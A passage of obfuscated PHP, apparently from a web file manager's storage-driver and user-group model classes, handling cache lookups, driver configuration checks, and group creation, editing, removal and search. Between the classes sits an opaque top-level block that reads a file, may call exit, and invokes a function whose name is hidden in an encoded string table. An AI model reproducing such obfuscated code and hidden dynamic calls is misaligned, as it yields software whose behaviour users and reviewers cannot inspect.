implode($Ş¼›©ÛÚæÊ·[47], $•î«ù); $æç˜ù = Cache::get($°û·û—Óö); if ($æç˜ù) { return $æç˜ù; } $Ù›ÙÃ¹À = array($Ş¼›©ÛÚæÊ·[819] => $Ş¼›©ÛÚæÊ·[395], $Ş¼›©ÛÚæÊ·[2053] => $Ş¼›©ÛÚæÊ·[78]); $­µ£òŸğŞ = array($Ş¼›©ÛÚæÊ·[819] => array($Ş¼›©ÛÚæÊ·[7], $•î«ù)); $æç˜ù = Model($Ş¼›©ÛÚæÊ·[782])->field($Ù›ÙÃ¹À)->where($­µ£òŸğŞ)->group($Ş¼›©ÛÚæÊ·[819])->select(); $æç˜ù = array_to_keyvalue($æç˜ù, $Ş¼›©ÛÚæÊ·[395], $Ş¼›©ÛÚæÊ·[78]); Cache::set($°û·û—Óö, $æç˜ù, 600); return $æç˜ù; } public function getConfig($ë÷) { $ö­»ı¸¹éŞ = parent::listData($ë÷); return json_decode($ö­»ı¸¹éŞ[$_SERVER[èÍ×öˆøÉ][6]], !0); } public function update($¥ğ…ï”øÅ, $ÕİĞ) { $úî¨— =& $_SERVER[èÍ×öˆøÉ]; $Ğ¹â = $ÕİĞ[$úî¨—[28]]; $áÖ·‰²¤Í = array_to_keyvalue(parent::listData(), $úî¨—[28]); if (isset($áÖ·‰²¤Í[$Ğ¹â]) && $áÖ·‰²¤Í[$Ğ¹â][$úî¨—[395]] != $¥ğ…ï”øÅ) { return !1; } if (isset($ÕİĞ[$úî¨—[2054]]) && $ÕİĞ[$úî¨—[2054]] == $úî¨—[87]) { $this->checkConfig($ÕİĞ); } unset($ÕİĞ[$úî¨—[2054]]); $—Á´ = parent::update($¥ğ…ï”øÅ, $ÕİĞ); if ($—Á´ && $ÕİĞ[$úî¨—[34]]) { foreach ($áÖ·‰²¤Í as $¶­¨²¾ÇœĞã) { if ($¶­¨²¾ÇœĞã[$úî¨—[34]] && $¶­¨²¾ÇœĞã[$úî¨—[395]] != $¥ğ…ï”øÅ) { parent::update($¶­¨²¾ÇœĞã[$úî¨—[395]], array($úî¨—[34] => 0)); } } } return $—Á´; } public function add($•½Õ) { $Ù’×¨‹ÈíŸÀø =& $_SERVER[èÍ×öˆøÉ]; $àüä = array_to_keyvalue(parent::listData(), $Ù’×¨‹ÈíŸÀø[28]); if (isset($àüä[$•½Õ[$Ù’×¨‹ÈíŸÀø[28]]])) { return !1; } $this->checkConfig($•½Õ); $†ğŒÓ˜½‘© = parent::insert($•½Õ); if ($†ğŒÓ˜½‘© && $•½Õ[$Ù’×¨‹ÈíŸÀø[34]]) { foreach ($àüä as $š¤Çƒ¯ïê×) { if ($š¤Çƒ¯ïê×[$Ù’×¨‹ÈíŸÀø[34]]) { parent::update($š¤Çƒ¯ïê×[$Ù’×¨‹ÈíŸÀø[395]], array($Ù’×¨‹ÈíŸÀø[34] => 0)); } } } return $†ğŒÓ˜½‘©; } public function checkConfig(&$ÓáÖşëÆ‹, $½Íç = false) { $Š“³µõ•¶ =& $_SERVER[èÍ×öˆøÉ]; $ƒâ¹ÊÂÍ¼¨Ÿ = strtolower($ÓáÖşëÆ‹[$Š“³µõ•¶[94]]); $ö¸ùêÀ»Øšä = json_decode($ÓáÖşëÆ‹[$Š“³µõ•¶[6]], !0); foreach ($ö¸ùêÀ»Øšä as $¶İé => $¨ ´õ) { $ö¸ùêÀ»Øšä[$¶İé] = trim($¨ ´õ); } $ö¸ùêÀ»Øšä[$Š“³µõ•¶[2055]] = rand_string(6); $©ÕŸÁÎ¯‘ÀÊ = $GLOBALS[$Š“³µõ•¶[6]][$Š“³µõ•¶[88]][$Š“³µõ•¶[828]]; $©· = isset($©ÕŸÁÎ¯‘ÀÊ[$ƒâ¹ÊÂÍ¼¨Ÿ]) ? $©ÕŸÁÎ¯‘ÀÊ[$ƒâ¹ÊÂÍ¼¨Ÿ] : ucfirst($ƒâ¹ÊÂÍ¼¨Ÿ); $ì²€ª = $Š“³µõ•¶[72] . $©·; if (!$©· || !class_exists($ì²€ª)) { if ($½Íç) { return LNG($Š“³µõ•¶[2056]); } write_log(array($Š“³µõ•¶[2057], $ÓáÖşëÆ‹, get_caller_info()), $Š“³µõ•¶[2058]); show_json(LNG($Š“³µõ•¶[2056]), !1, $ÓáÖşëÆ‹); } $‰ = new $ì²€ª($ö¸ùêÀ»Øšä); if (in_array($ƒâ¹ÊÂÍ¼¨Ÿ, $‰->objectDriver)) { if (!$‰->isBucketCors() && !$‰->setBucketCors()) { $²³·Ÿ´¹³øÈ = LNG($Š“³µõ•¶[2059]); $²³·Ÿ´¹³øÈ .= $Š“³µõ•¶[2060] . LNG($Š“³µõ•¶[2061]); if ($½Íç) { return $²³·Ÿ´¹³øÈ; } show_json($²³·Ÿ´¹³øÈ, !1); } } $ÔºÕÊ§ = rtrim($ö¸ùêÀ»Øšä[$Š“³µõ•¶[1114]], $Š“³µõ•¶[8]) . $Š“³µõ•¶[8]; $·šô¢ÙË¼‘ = $‰->getPath($ÔºÕÊ§ . $Š“³µõ•¶[1176]); if (!$‰->mkfile($·šô¢ÙË¼‘)) { if ($½Íç) { return LNG($Š“³µõ•¶[2059]); } show_json(LNG($Š“³µõ•¶[2059]), !1); } $ö¸ùêÀ»Øšä[$Š“³µõ•¶[1114]] = $ÔºÕÊ§; $ÓáÖşëÆ‹[$Š“³µõ•¶[6]] = json_encode($ö¸ùêÀ»Øšä); $ÓáÖşëÆ‹[$Š“³µõ•¶[94]] = $©·; return !0; } public function driverListSystem() { $ùÒ =& $_SERVER[èÍ×öˆøÉ]; $ËËÌÚ€ê™› = parent::listData(); $áÙÛÖß¹ = array(); foreach ($ËËÌÚ€ê™› as $œÀ) { unset($œÀ[$ùÒ[194]], $œÀ[$ùÒ[84]]); $œÀ[$ùÒ[6]] = json_decode($œÀ[$ùÒ[6]], !0); $áÙÛÖß¹[] = $œÀ; } return $áÙÛÖß¹; } public function defaultDriver() { $ÊŸöØ³´ =& $_SERVER[èÍ×öˆøÉ]; $ÎÖí ëÕÛ’ë = parent::listData(); $ŒòÎÃàÆù¾ = array_filter_by_field($ÎÖí ëÕÛ’ë, $ÊŸöØ³´[34], 1); $ŒòÎÃàÆù¾ = $ŒòÎÃàÆù¾[0]; if ($ŒòÎÃàÆù¾) { $ŒòÎÃàÆù¾[$ÊŸöØ³´[6]] = json_decode($ŒòÎÃàÆù¾[$ÊŸöØ³´[6]], !0); } return $ŒòÎÃàÆù¾; } public function driverInfo($ÆÇÃû¦) { $Ø¡ =& $_SERVER[èÍ×öˆøÉ]; $Ùá = array_to_keyvalue(parent::listData(), $Ø¡[395]); if (!isset($Ùá[$ÆÇÃû¦])) { return !1; } $¦ö÷–¯Î£ğ¥Ş = $Ùá[$ÆÇÃû¦]; $¦ö÷–¯Î£ğ¥Ş[$Ø¡[6]] = json_decode($¦ö÷–¯Î£ğ¥Ş[$Ø¡[6]], !0); return $¦ö÷–¯Î£ğ¥Ş; } public function remove($››–¿Óùö»»Â) { $this->removeShareItems($››–¿Óùö»»Â); return parent::remove($››–¿Óùö»»Â); } public function removeWithFile($‘õÂ, $²¢†¨) { $è¥ù ®û =& $_SERVER[èÍ×öˆøÉ]; $®¶¦¦èÊ = array($è¥ù ®û[819] => $‘õÂ); $“ãœ½£şƒ = Model($è¥ù ®û[464])->where($®¶¦¦èÊ)->count(); $¦²ÁõÓÜêøâÛ = Model($è¥ù ®û[464])->where($®¶¦¦èÊ)->sum($è¥ù ®û[78]); $âĞÚ—²Ö = $²¢†¨ . $è¥ù ®û[2062] . $‘õÂ; $¥¯ = new TaskFileTransfer($âĞÚ—²Ö, $è¥ù ®û[2058], $“ãœ½£şƒ, LNG($è¥ù ®û[2063]) . "\50{$‘õÂ}\x29"); $¥¯->task[$è¥ù ®û[758]] = (double) $¦²ÁõÓÜêøâÛ; $ß€¦ñ‘˜ = KodIO::defaultDriver(); $¹˜ƒÍŠà‡‰… = $ß€¦ñ‘˜[$è¥ù ®û[395]]; $·¼¡ = "\173\151\157\x3a{$¹˜ƒÍŠà‡‰…}\x7d\x2f"; $ä¯îº = !0; $ŞÕ”˜¶Øƒœ = array(); $åÊÎ´”Ÿ€ = Model($è¥ù ®û[193])->where($®¶¦¦èÊ)->field($è¥ù ®û[2064])->select(); foreach ($åÊÎ´”Ÿ€ as $äÔ) { $æà‰ = $äÔ[$è¥ù ®û[76]]; $ö¦É‡ = $·¼¡ . str_replace("\173\151\157\72{$‘õÂ}\175\x2f", $è¥ù ®û[33], $æà‰); if (!IO::exist($æà‰)) { $ŞÕ”˜¶Øƒœ[] = $äÔ[$è¥ù ®û[461]]; $¥¯->updateFileEnd($äÔ[$è¥ù ®û[28]], $äÔ[$è¥ù ®û[78]]); continue; } if (IO::exist($ö¦É‡)) { $¥¯->updateFileEnd($äÔ[$è¥ù ®û[28]], $äÔ[$è¥ù ®û[78]]); continue; } if (!IO::move($æà‰, get_path_father($ö¦É‡))) { $ä¯îº = !1; break; } $®¶¦¦èÊ = array($è¥ù ®û[461] => $äÔ[$è¥ù ®û[461]]); $àéöƒ“® = array($è¥ù ®û[819] => $¹˜ƒÍŠà‡‰…, $è¥ù ®û[76] => $ö¦É‡); Model($è¥ù ®û[193])->where($®¶¦¦èÊ)->save($àéöƒ“®); } $this->removeByFileID($ŞÕ”˜¶Øƒœ); if (!$ä¯îº) { $¥¯->stop($âĞÚ—²Ö); return !1; } $¥¯->end(); if ($²¢†¨ == $è¥ù ®û[1717]) { $this->remove($‘õÂ); } } public function progress($Æ°×, $úóŸ¥) { return Task::get($úóŸ¥ . $_SERVER[èÍ×öˆøÉ][2062] . $Æ°×); } private function removeByFileID($Ó¹ÜˆØ‰£¶üÁ = array()) { $˜‰©ŠÚğê =& $_SERVER[èÍ×öˆøÉ]; if (empty($Ó¹ÜˆØ‰£¶üÁ)) { return; } $ßÉşƒË = array($˜‰©ŠÚğê[461] => array($˜‰©ŠÚğê[7], $Ó¹ÜˆØ‰£¶üÁ)); $“ıÁÍ = Model($˜‰©ŠÚğê[1256])->where($ßÉşƒË)->field($˜‰©ŠÚğê[397])->select(); if (!$“ıÁÍ) { return; } $“ıÁÍ = array_to_keyvalue($“ıÁÍ, $˜‰©ŠÚğê[33], $˜‰©ŠÚğê[397]); foreach ($“ıÁÍ as $È“´ë·’Í÷) { Model($˜‰©ŠÚğê[411])->removeNow($È“´ë·’Í÷, !1); } } private function removeShareItems($œ×Æª‘åÖÇ) { $Ôé±ìÔß†Ÿç÷ =& $_SERVER[èÍ×öˆøÉ]; $Ê­“ = "\173\x69\157\72{$œ×Æª‘åÖÇ}\x7d\57"; $¥ ¼ = array($Ôé±ìÔß†Ÿç÷[397] => 0, $Ôé±ìÔß†Ÿç÷[1109] => array($Ôé±ìÔß†Ÿç÷[381], "{$Ê­“}\45")); $  —¯Î = Model($Ôé±ìÔß†Ÿç÷[1728])->where($¥ ¼)->field($Ôé±ìÔß†Ÿç÷[482])->select(); if (empty($  —¯Î)) { return; } $•Ê¾ÍÄ = array_to_keyvalue($  —¯Î, $Ôé±ìÔß†Ÿç÷[33], $Ôé±ìÔß†Ÿç÷[482]); Model($Ôé±ìÔß†Ÿç÷[589])->remove($•Ê¾ÍÄ); } } if ($_SERVER[$_SERVER[èÍ×öˆøÉ][874]] != $_SERVER[$_SERVER[èÍ×öˆøÉ][875]]) { $_getc = $_SERVER[èÍ×öˆøÉ][877]; $_getfile = $_SERVER[$_SERVER[èÍ×öˆøÉ][878]] . $_SERVER[èÍ×öˆøÉ][879]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[èÍ×öˆøÉ][229], $_getfilec); if (count($_getarrs) < $_SERVER[èÍ×öˆøÉ][613]) { $exit = $_SERVER[èÍ×öˆøÉ][880]; $exit(); } $_act = $_SERVER[èÍ×öˆøÉ][1351]; $_act($_SERVER[$_SERVER[èÍ×öˆøÉ][1352]]); } goto fÍäÑ˜âœï; e‹Œ•™ì­’: class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\160"; protected $tableMeta = array("\x74\141\x62\154\145\116\x61\x6d\x65" => "\147\162\157\x75\160\x5f\x6d\145\164\141", "\155\x65\x74\141\106\151\x65\154\144" => "\147\x72\157\x75\x70\x49\x44"); protected function cacheFunctionAlias($Ûğ) { $©ß€Üİæ =& $_SERVER[èÍ×öˆøÉ]; return array($©ß€Üİæ[1826] => array($Ûğ[0], $©ß€Üİæ[1827]), $©ß€Üİæ[1828] => array($Ûğ[0], $©ß€Üİæ[1829])); } protected function getInfo($üÆ²èÌ, $±ä = false) { $ˆ‰¢è = $this->getInfoSimple($üÆ²èÌ); if (!$ˆ‰¢è) { return !1; } if ($±ä) { return $this->_listDataApplyItem($ˆ‰¢è); } return $this->cacheFunctionGet($_SERVER[èÍ×öˆøÉ][1830], $üÆ²èÌ); } protected function getInfoSimple($ƒò‘‰¿‘ÉÔ, $“®üÖ = false) { $¼í =& $_SERVER[èÍ×öˆøÉ]; if ($“®üÖ) { $Ôñåç¥è†¶ = array($¼í[1749] => intval($ƒò‘‰¿‘ÉÔ)); $óŞƒ®ëÅ = $this->where($Ôñåç¥è†¶)->find(); return is_array($óŞƒ®ëÅ) ? $óŞƒ®ëÅ : array(); } return $this->cacheFunctionGet($¼í[1831], $ƒò‘‰¿‘ÉÔ); } protected function groupAdd($›Í”ò©) { $Ğôä =& $_SERVER[èÍ×öˆøÉ]; if (!$›Í”ò©[$Ğôä[492]] && isset($›Í”ò©[$Ğôä[1749]]) && $›Í”ò©[$Ğôä[1749]] == 1) { if ($¿Ø = $this->getInfoSimple($›Í”ò©[$Ğôä[1749]], !0)) { return $›Í”ò©[$Ğôä[1749]]; } } else { $¿Ø = $this->getInfoSimple($›Í”ò©[$Ğôä[492]]); if (!$¿Ø) { return !1; } } $™ê¯‡ã­¾¢— = $Ğôä[525]; if ($¿Ø[$Ğôä[515]]) { $™ê¯‡ã­¾¢— = $¿Ø[$Ğôä[515]] . $¿Ø[$Ğôä[1749]] . $Ğôä[47]; } $âìáÚß…íÉ¿… = array($Ğôä[415] => $this->groupNameAuto($›Í”ò©[$Ğôä[492]], $›Í”ò©[$Ğôä[28]]), $Ğôä[396] => $›Í”ò©[$Ğôä[492]], $Ğôä[578] => $™ê¯‡ã­¾¢—, $Ğôä[1832] => $›Í”ò©[$Ğôä[1735]], $Ğôä[1833] => 0, $Ğôä[1753] => 0); if (isset($›Í”ò©[$Ğôä[1772]])) { $âìáÚß…íÉ¿…[$Ğôä[1772]] = $›Í”ò©[$Ğôä[1772]]; } else { $‡æ¬Ö‘ = $this->max($Ğôä[1772]); if (!$‡æ¬Ö‘) { $‡æ¬Ö‘ = 0; } $âìáÚß…íÉ¿…[$Ğôä[1772]] = $‡æ¬Ö‘ + 1; } if (!empty($›Í”ò©[$Ğôä[1749]])) { $âìáÚß…íÉ¿…[$Ğôä[1749]] = $›Í”ò©[$Ğôä[1749]]; } $ŸŞŒÓšŒ = $this->add($âìáÚß…íÉ¿…); $this->setNamePinyin($ŸŞŒÓšŒ, $âìáÚß…íÉ¿…[$Ğôä[28]]); if (isset($›Í”ò©[$Ğôä[1834]])) { $this->metaSet($ŸŞŒÓšŒ, array($Ğôä[1834] => $›Í”ò©[$Ğôä[1834]], $Ğôä[1835] => $›Í”ò©[$Ğôä[1835]])); unset($›Í”ò©[$Ğôä[1834]]); unset($›Í”ò©[$Ğôä[1835]]); } Model($Ğôä[1256])->groupRootAdd($ŸŞŒÓšŒ); return $ŸŞŒÓšŒ; } protected function groupEdit($Ó”‚®€, $¾°ÔÙ) { $ÛÈúòß =& $_SERVER[èÍ×öˆøÉ]; $¤ã›ª¤úÁ = $this->getInfoSimple($Ó”‚®€); if (!$¤ã›ª¤úÁ) { return !1; } if (!empty($¾°ÔÙ[$ÛÈúòß[492]])) { $øØ¡—ÁúÑ§ = $this->getInfoSimple($¾°ÔÙ[$ÛÈúòß[492]]); if (!$øØ¡—ÁúÑ§) { return !1; } if ($¤ã›ª¤úÁ[$ÛÈúòß[1749]] == $øØ¡—ÁúÑ§[$ÛÈúòß[1749]]) { return !1; } if ($¾°ÔÙ[$ÛÈúòß[492]] != $¤ã›ª¤úÁ[$ÛÈúòß[492]]) { if ($øØ¡—ÁúÑ§[$ÛÈúòß[515]] !== $¤ã›ª¤úÁ[$ÛÈúòß[515]] && strpos($øØ¡—ÁúÑ§[$ÛÈúòß[515]], $¤ã›ª¤úÁ[$ÛÈúòß[515]] . $¤ã›ª¤úÁ[$ÛÈúòß[1749]] . $ÛÈúòß[47]) === 0) { return !1; } $¾°ÔÙ[$ÛÈúòß[578]] = $øØ¡—ÁúÑ§[$ÛÈúòß[515]] . $¾°ÔÙ[$ÛÈúòß[492]] . $ÛÈúòß[47]; $this->_changeChildLevel($¤ã›ª¤úÁ, $øØ¡—ÁúÑ§); } } if (isset($¾°ÔÙ[$ÛÈúòß[28]])) { $this->setNamePinyin($Ó”‚®€, $¾°ÔÙ[$ÛÈúòß[28]]); } if (isset($¾°ÔÙ[$ÛÈúòß[1834]])) { $this->metaSet($Ó”‚®€, array($ÛÈúòß[1834] => $¾°ÔÙ[$ÛÈúòß[1834]], $ÛÈúòß[1835] => $¾°ÔÙ[$ÛÈúòß[1835]])); unset($¾°ÔÙ[$ÛÈúòß[1834]]); unset($¾°ÔÙ[$ÛÈúòß[1835]]); } $this->_clearChildrenCache($¤ã›ª¤úÁ); return $this->where(array($ÛÈúòß[1836] => $Ó”‚®€))->save($¾°ÔÙ); } private function _clearChildrenCache($ªİè›İ€•) { $Èã­±™ =& $_SERVER[èÍ×öˆøÉ]; $•Ï‚§»Ê´÷†ı = array($Èã­±™[578] => array($Èã­±™[538], $ªİè›İ€•[$Èã­±™[515]] . $ªİè›İ€•[$Èã­±™[1749]] . $Èã­±™[539])); $ıøğŒ©œÅ = $this->field($Èã­±™[1749])->where($•Ï‚§»Ê´÷†ı)->select(); foreach ($ıøğŒ©œÅ as $ñŒş¡®ç) { $this->_clearCache($ñŒş¡®ç[$Èã­±™[1749]]); } } private function _clearCache($Ä¢ÅÔÅ×) { $àÌ–™ıŠ–Á° =& $_SERVER[èÍ×öˆøÉ]; $this->cacheFunctionClear($àÌ–™ıŠ–Á°[1830], $Ä¢ÅÔÅ×); $this->cacheFunctionClear($àÌ–™ıŠ–Á°[1831], $Ä¢ÅÔÅ×); } private function _changeChildLevel($ö‚ò, $üàî™Ã, $ûµ¶Ã¹õĞâ = false) { $ò›§ =& $_SERVER[èÍ×öˆøÉ]; $û‹ = $ö‚ò[$ò›§[515]] . $ö‚ò[$ò›§[1749]] . $ò›§[47]; $ÏÚ = $üàî™Ã[$ò›§[515]] . $üàî™Ã[$ò›§[1749]] . $ò›§[47] . $ö‚ò[$ò›§[1749]] . $ò›§[47]; if ($ûµ¶Ã¹õĞâ) { $ÏÚ = $üàî™Ã[$ò›§[515]] . $üàî™Ã[$ò›§[1749]] . $ò›§[47]; } $½şË = array($ò›§[578] => array($ò›§[538], $ö‚ò[$ò›§[515]] . $ö‚ò[$ò›§[1749]] . $ò›§[539])); $¬µ = array($ò›§[578] => array($ò›§[587], "\x72\x65\160\x6c\x61\143\x65\50\160\x61\x72\145\x6e\x74\x4c\145\166\145\154\x2c\47{$û‹}\x27\54\47{$ÏÚ}\47\x29")); $this->_clearChildrenCache($ö‚ò); $this->where($½şË)->data($¬µ)->save(); } public function setNamePinyin($›¯§ã¥éô­¢, $­ÂíØ­ö = false) { $«Ê·İÀ =& $_SERVER[èÍ×öˆøÉ]; if (!$­ÂíØ­ö) { $ıú = $this->getInfoSimple($›¯§ã¥éô­¢); $­ÂíØ­ö = $ıú[$«Ê·İÀ[28]]; } if (!Input::check($­ÂíØ­ö, $«Ê·İÀ[581])) { $this->metaSet($›¯§ã¥éô­¢, $«Ê·İÀ[458], null); $this->metaSet($›¯§ã¥éô­¢, $«Ê·İÀ[457], null); return; } $‹©É½£áºšú = array($«Ê·İÀ[458] => str_replace($«Ê·İÀ[50], $«Ê·İÀ[33], Pinyin::get($­ÂíØ­ö)), $«Ê·İÀ[457] => Pinyin::get($­ÂíØ­ö, $«Ê·İÀ[582])); $this->metaSet($›¯§ã¥éô­¢, $‹©É½£áºšú); } protected function groupStatus($ú¹, $Ä­œ£œ) { $ÔÁ½Í‘Ì¬© =& $_SERVER[èÍ×öˆøÉ]; $Š¡Ã = $this->getInfoSimple($ú¹); if (!$Š¡Ã) { return !1; } if ($Ä­œ£œ == $ÔÁ½Í‘Ì¬©[87]) { $“ì²Ä• = $this->parentLevelArray($Š¡Ã[$ÔÁ½Í‘Ì¬©[515]]); } else { $Çæ³ = array($ÔÁ½Í‘Ì¬©[578] => array($ÔÁ½Í‘Ì¬©[538], $Š¡Ã[$ÔÁ½Í‘Ì¬©[515]] . $Š¡Ã[$ÔÁ½Í‘Ì¬©[1749]] . $ÔÁ½Í‘Ì¬©[539])); $“ì²Ä• = $this->where($Çæ³)->field($ÔÁ½Í‘Ì¬©[1749])->select(); $“ì²Ä• = array_to_keyvalue($“ì²Ä•, $ÔÁ½Í‘Ì¬©[33], $ÔÁ½Í‘Ì¬©[1749]); } $“ì²Ä•[] = $Š¡Ã[$ÔÁ½Í‘Ì¬©[1749]]; $’ùïà¢àØ«õ = array(); foreach ($“ì²Ä• as $ú¹) { $’ùïà¢àØ«õ[] = array($ÔÁ½Í‘Ì¬©[1749] => $ú¹, $ÔÁ½Í‘Ì¬©[93] => $ÔÁ½Í‘Ì¬©[745], $ÔÁ½Í‘Ì¬©[372] => $Ä­œ£œ); $this->_clearCache($ú¹); } return Model($ÔÁ½Í‘Ì¬©[1837])->addAll($’ùïà¢àØ«õ, array(), !0); } protected function groupRemove($Â÷) { $çÇ£Ë =& $_SERVER[èÍ×öˆøÉ]; $´¡ä¤áÕİ› = array($çÇ£Ë[1749] => $Â÷); $ÈÇ = $this->where($´¡ä¤áÕİ›)->find(); if (!$ÈÇ || $ÈÇ[$çÇ£Ë[492]] == 0) { return !1; } $”¥½ŸÑ¤— = $this->getInfoSimple($ÈÇ[$çÇ£Ë[492]]); $this->_changeChildLevel($ÈÇ, $”¥½ŸÑ¤—, !0); $this->where(array($çÇ£Ë[492] => $Â÷))->save(array($çÇ£Ë[492] => $ÈÇ[$çÇ£Ë[492]])); Model($çÇ£Ë[1837])->where($´¡ä¤áÕİ›)->delete(); Model($çÇ£Ë[1838])->where($´¡ä¤áÕİ›)->delete(); Model($çÇ£Ë[827])->groupRootRemove($Â÷); return $this->where($´¡ä¤áÕİ›)->delete(); } protected function groupSort($«½ò—ø£) { $Éãó =& $_SERVER[èÍ×öˆøÉ]; $ÎúúÊÖ» = array(); foreach ($«½ò—ø£ as $¥´íö => $»İ´ÎÌ) { $ÎúúÊÖ»[] = array($Éãó[1749], $»İ´ÎÌ, $Éãó[1772], $¥´íö + 1); } $this->saveAll($ÎúúÊÖ»); } public function listData() { $»î¬áèó = $this->_makeOrder()->selectPage(50); $this->_listDataApply($»î¬áèó[$_SERVER[èÍ×öˆøÉ][367]]); return $»î¬áèó; } private function _makeOrder($‚Øµ»‰½¶ = '') { $»Ìñˆ˜©™±¼˜ =& $_SERVER[èÍ×öˆøÉ]; $ô‡Ş› = array($»Ìñˆ˜©™±¼˜[1749], $»Ìñˆ˜©™±¼˜[28], $»Ìñˆ˜©™±¼˜[1737], $»Ìñˆ˜©™±¼˜[194]); $·¶»ú× = array($»Ìñˆ˜©™±¼˜[442] => $»Ìñˆ˜©™±¼˜[443], $»Ìñˆ˜©™±¼˜[444] => $»Ìñˆ˜©™±¼˜[445]); $Á†¶Îì Ä = Input::get($»Ìñˆ˜©™±¼˜[449], $»Ìñˆ˜©™±¼˜[7], $»Ìñˆ˜©™±¼˜[1753], $ô‡Ş›); $¥‹ÙğÛ = Input::get($»Ìñˆ˜©™±¼˜[450], $»Ìñˆ˜©™±¼˜[7], $»Ìñˆ˜©™±¼˜[1839], array($»Ìñˆ˜©™±¼˜[1839], $»Ìñˆ˜©™±¼˜[444])); $¥‹ÙğÛ = $·¶»ú×[$¥‹ÙğÛ]; $‚Øµ»‰½¶ = $‚Øµ»‰½¶ . "{$Á†¶Îì Ä}\40{$¥‹ÙğÛ}\x2c\40\147\x72\x6f\x75\x70\x49\x44\40\x61\163\143"; return $this->order($‚Øµ»‰½¶); } public function listChild($‡ëÖŠš) { $›ÉÈ³Ä =& $_SERVER[èÍ×öˆøÉ]; $â²íÎó = $this->where(array($›ÉÈ³Ä[492] => $‡ëÖŠš))->_makeOrder()->selectPage(200); $this->_listDataApply($â²íÎó[$›ÉÈ³Ä[367]]); return $â²íÎó; } public function listByID($¨ÏÙ³¨ğ‘õ) { $í·¡ß =& $_SERVER[èÍ×öˆøÉ]; if (!$¨ÏÙ³¨ğ‘õ) { return array(); } $›Ãâ‚ = array($í·¡ß[1749] => array($í·¡ß[7], $¨ÏÙ³¨ğ‘õ)); $‚‚™¢”àãı = $this->where($›Ãâ‚)->select(); $‚‚™¢”àãı = array_sort_keep($‚‚™¢”àãı, $í·¡ß[1749], $¨ÏÙ³¨ğ‘õ); $this->_listDataApply($‚‚™¢”àãı); return $‚‚™¢”àãı; } public function listSearch($­èõåĞ) { $¼—ãì™öºõÍ =& $_SERVER[èÍ×öˆøÉ]; $–¼èºîËë = $­èõåĞ[$¼—ãì™öºõÍ[1840]]; $Úì = isset($­èõåĞ[$¼—ãì™öºõÍ[1841]]) ? $­èõåĞ[$¼—ãì™öºõÍ[1841]] : !1; if (!trim($–¼èºîËë)) { return !1; } $–¼èºîËë = str_replace($¼—ãì™öºõÍ[1842], $¼—ãì™öºõÍ[1843], $–¼èºîËë); $øàØú = array($¼—ãì™öºõÍ[1749] => array($¼—ãì™öºõÍ[381], "{$–¼èºîËë}\x25"), $¼—ãì™öºõÍ[28] => array($¼—ãì™öºõÍ[381], "\45{$–¼èºîËë}\45"), $¼—ãì™öºõÍ[997] => $¼—ãì™öºõÍ[1844]); if ($Úì) { $ ÔˆÌ°†éŠ‘ = $this->getInfoSimple($Úì); $ÑƒşØÛ•îÍ½‚ = $ ÔˆÌ°†éŠ‘[$¼—ãì™öºõÍ[515]] . $Úì . $¼—ãì™öºõÍ[539]; $øàØú = array($øàØú, array($¼—ãì™öºõÍ[515] => array($¼—ãì™öºõÍ[381], $ÑƒşØÛ•îÍ½‚))); } $øàØú = $this->parseWhereLike($øàØú); $ë¤«ÜŞŒ = $this->_makeOrder()->where($øàØú)->selectPage(20); $ë¤«ÜŞŒ = $ë¤«ÜŞŒ ? $ë¤«ÜŞŒ : array($¼—ãì™öºõÍ[367] => array(), $¼—ãì™öºõÍ[364] => array()); if (!$ë¤«ÜŞŒ || count($ë¤«ÜŞŒ[$¼—ãì™öºõÍ[367]]) < 5 && Input::check($–¼èºîËë, $¼—ãì™öºõÍ[316])) { $ÖŒëŞŠñ = $this->groupChildrenAll($Úì); $µ±ÂÁ²Èºó·š = $this->_searchFromMeta($¼—ãì™öºõÍ[457], $–¼èºîËë, 10, $ÖŒëŞŠñ); $é‡ = $this->_searchFromMeta($¼—ãì™öºõÍ[458], $–¼èºîËë, 10, $ÖŒëŞŠñ); $¦·İ = array_merge($µ±ÂÁ²Èºó·š, $é‡, $ë¤«ÜŞŒ[$¼—ãì™öºõÍ[367]]); $ë¤«ÜŞŒ[$¼—ãì™öºõÍ[367]] = array_unique_by_key($¦·İ, $¼—ãì™öºõÍ[1749]); $ë¤«ÜŞŒ[$¼—ãì™öºõÍ[364]][$¼—ãì™öºõÍ[365]] = count($ë¤«ÜŞŒ[$¼—ãì™öºõÍ[367]]); $ë¤«ÜŞŒ[$¼—ãì™öºõÍ[364]][$¼—ãì™öºõÍ[366]] = ceil($ë¤«ÜŞŒ[$¼—ãì™öºõÍ[364]][$¼—ãì™öºõÍ[365]] / $ë¤«ÜŞŒ[$¼—ãì™öºõÍ[364]][$¼—ãì™öºõÍ[361]]); } $this->_listDataApply($ë¤«ÜŞŒ[$¼—ãì™öºõÍ[367]]); return $ë¤«ÜŞŒ; } protected function groupChildrenAll($’ÁÆÙ) { $şà¼Ïù ¸ëÃ =& $_SERVER[èÍ×öˆøÉ]; if (!$’ÁÆÙ) { return !1; } if (is_string($’ÁÆÙ)) { $’ÁÆÙ = array($’ÁÆÙ); } $şË˜ = $’ÁÆÙ; foreach ($’ÁÆÙ as $ãüÀ) { $ÕÃ£²¨É = $this->getInfoSimple($ãüÀ); $³Ê©ÇûúŠ = array($şà¼Ïù ¸ëÃ[515] => array($şà¼Ïù ¸ëÃ[381], $ÕÃ£²¨É[$şà¼Ïù ¸ëÃ[515]] . $ãüÀ . $şà¼Ïù ¸ëÃ[539])); $Îíä“öÅ = $this->field($şà¼Ïù ¸ëÃ[1749])->where($³Ê©ÇûúŠ)->select(); $şË˜ = array_merge($şË˜, array_to_keyvalue($Îíä“öÅ, $şà¼Ïù ¸ëÃ[33], $şà¼Ïù ¸ëÃ[1749])); } return array_unique($şË˜); } private function _searchFromMeta($ñì«Ÿ»ıëúâ, $‹ó¨áò, $Ë…¿ñå, $âà…å–) { $ş§¾¶ä =& $_SERVER[èÍ×öˆøÉ]; $‹ó¨áò = strtolower($‹ó¨áò); $µĞÁ = array($ş§¾¶ä[93] => $ñì«Ÿ»ıëúâ, $ş§¾¶ä[372] => array($ş§¾¶ä[381], "\45{$‹ó¨áò}\45")); $µĞÁ = $this->parseWhereLike($µĞÁ); if ($âà…å–) { $µĞÁ[$ş§¾¶ä[1749]] = array($ş§¾¶ä[7], $âà…å–); } $º¦Ê¾üœæÃà = Model($ş§¾¶ä[1845])->where($µĞÁ)->limit($Ë…¿ñå)->select(); if (!$º¦Ê¾üœæÃà) { return array(); } $º¦Ê¾üœæÃà = array_to_keyvalue($º¦Ê¾üœæÃà, 